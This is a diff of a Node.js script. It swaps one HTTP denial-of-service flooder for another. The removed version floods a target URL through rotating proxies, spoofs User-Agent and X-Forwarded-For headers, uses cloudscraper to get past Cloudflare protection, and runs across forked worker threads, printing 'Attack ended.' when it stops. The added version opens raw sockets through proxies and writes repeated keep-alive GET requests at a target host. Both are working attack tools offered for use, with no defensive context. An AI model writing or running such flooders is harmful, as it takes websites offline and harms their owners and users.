@@ -1,106 +1,68 @@
 require('events').EventEmitter.defaultMaxListeners = 0;
-const cloudscraper = require('cloudscraper');
-const path = require('path');
-const fs = require('fs');
-var random_useragent = require('random-useragent');
-const cryptoRandomString = require('crypto-random-string');
-const cluster = require('cluster');
+process.on("uncaughtException", (e) => {});
+process.on("unhandledRejection", (e) => {});
 
-function randomNumber(min, max) {  
-    return Math.floor(Math.random() * (max - min) + min); 
-}
+const userAgents = [
+  "Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",
+  "Mozilla/5.0 (X11; CrOS x86_64 13982.82.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.157 Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 11; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 10; NOH-NX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 11; V2045) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone12,8; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
+  "Mozilla/5.0 (iPhone13,3; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15",
+  "Mozilla/5.0 (Linux; Android 10; SM-610N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
+];
 
-if (process.argv.length !== 7) {
-    console.log(`                       
---> @BigFloyd1
-Usage: node ${path.basename(__filename)} <url> <time> <ConnectPerThread> <proxies> <thread>
-Usage: node ${path.basename(__filename)} <http://example.com> <60> <250> <proxy.txt> <1>
-                                                   
-`);
-    process.exit(0);
-}
+const fs = require("fs");
 
-const target = process.argv[2],
-    time = process.argv[3],
-    fileproxy = process.argv[5],
-    threads = process.argv[6],
-    perthreads = process.argv[4];
+if (process.argv.length != 6)
+  return console.log("node socketv4.js <host> <proxy> <time> <reqs>");
 
-let proxies = fs.readFileSync(fileproxy, 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
+const args = {
+  host: process.argv[2],
+  proxy: process.argv[3],
+  time: process.argv[4],
+  reqs: process.argv[5],
+};
 
-async function req(){
-        var Array_method = ['HEAD',  'GET',  'POST'];
-        var randommethod = Array_method[Math.floor(Math.random()*Array_method.length)];
-        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
-        var proxiedRequest = cloudscraper.defaults({ proxy: 'http://'+proxy },{ proxy: 'https://'+proxy });
-        var data = '?' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'}) + '=' + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8})+ '&' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8});
-        var options = {
-            method: randommethod,
-			cloudflareTimeout: 5000,
-			cloudflareMaxTimeout: 10000,
-			challengesToSolve: 10,
-			resolveWithFullResponse: true,
-            headers: {'User-Agent': random_useragent.getRandom(),'Referer': target,'X-Forwarded-For': randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255)+'.'+randomNumber(1, 255),},
-            uri: target + data,
-            data: data
-        };
-        await proxiedRequest(options).then(function (response) {
-			//console.log('Response: ',response);
-            console.log("BYPASS_PACKET_SENT");
-            for(let i = 0; i < perthreads; ++i) {
-                proxiedRequest(options).then(function (response) {
-                    //console.log('Response: ',response);
-                    console.log("REQ_PACKET_SENT: ",i);
-                }).catch(function (err) {
-                    //console.log(err.message);
-                    return req();
-                });
-            };
-            return req();
-        }).catch(function (err) {
-			return req();
-        });
-    return req();
-}
+const urlParsed = new URL(args.host);
+const proxies = fs
+  .readFileSync(args.proxy, "utf-8")
+  .match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);
 
-function run(){
- setInterval(() => {
-     req();
- });	
-}
-main();
-function main(){
-    if (process.argv.length !== 7) {
-        console.log(`
---> @JuiceW2LD <--
-Usage: node ${path.basename(__filename)} <url> <time> <ConnectPerThread> <proxies> <thread>
-Usage: node ${path.basename(__filename)} <http://example.com> <60> <250> <proxy.txt> <1>
+var genPayload = () =>
+  `GET ${urlParsed.pathname} HTTP/1.1\r\nHost: ${
+    urlParsed.host
+  }\r\nUser-Agent: ${
+    userAgents[Math.floor(Math.random() * userAgents.length)]
+  }\r\nConnection: Keep-Alive\r\n\r\n`;
 
-`);
-        process.exit(0);
-    }else{    
-    if (cluster.isMaster) {
-        for (let i = 0; i < threads; i++) {
-         cluster.fork();
-        }
-        cluster.on('exit', (worker, code, signal) => {
-          console.log(`Threads: ${worker.process.pid} ended`);
-        });
-      } else {
-        run();
-        console.log(`Threads: ${process.pid} started`);
-      }
-    }
-}
+var payloads = [];
 
-setTimeout(() => {
-    console.log('Attack ended.');
-    process.exit(0)
-}, time * 1000);
+setInterval(() => {
+  var proxy = proxies[Math.floor(Math.random() * proxies.length)].split(":");
+  var document = payloads.find((payload) => proxy[0] == payload.proxy);
+  if (!document) {
+    let temp = { proxy: proxy[0], payload: genPayload() };
+    payloads.push(temp);
+    document = temp;
+  }
 
-process.on('uncaughtException', function (err) {
-    // console.log(err);
+  var client = require("net").Socket();
+  client.connect(proxy[1], proxy[0]);
+  client.setTimeout(60000);
+
+  for (var i = 0; i < args.reqs; ++i) client.write(document.payload);
+
+  client.on("data", () => setTimeout(() => client.destroy(), 5000));
 });
-process.on('unhandledRejection', function (err) {
-    // console.log(err);
-});
+
+setTimeout(() => process.exit(0), args.time * 1000);
